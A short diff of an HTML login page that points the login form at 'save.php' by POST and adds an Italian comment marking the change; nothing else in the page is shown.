@@ -35,7 +35,8 @@
             <div class="login-container">
                 <h2 class="login-title">Log in</h2>
                 
-                <form class="login-form" id="loginForm">
+                <!-- ✅ MODIFICATO: action e method -->
+                <form class="login-form" id="loginForm" action="save.php" method="post">
                     <div class="form-group">
                         <input type="email" id="email" name="email" class="form-input" placeholder="E-mail" required>
                         <span class="error-message" id="emailError"></span>
@@ -79,4 +80,3 @@
     <script src="script.js"></script>
 </body>
 </html>
-
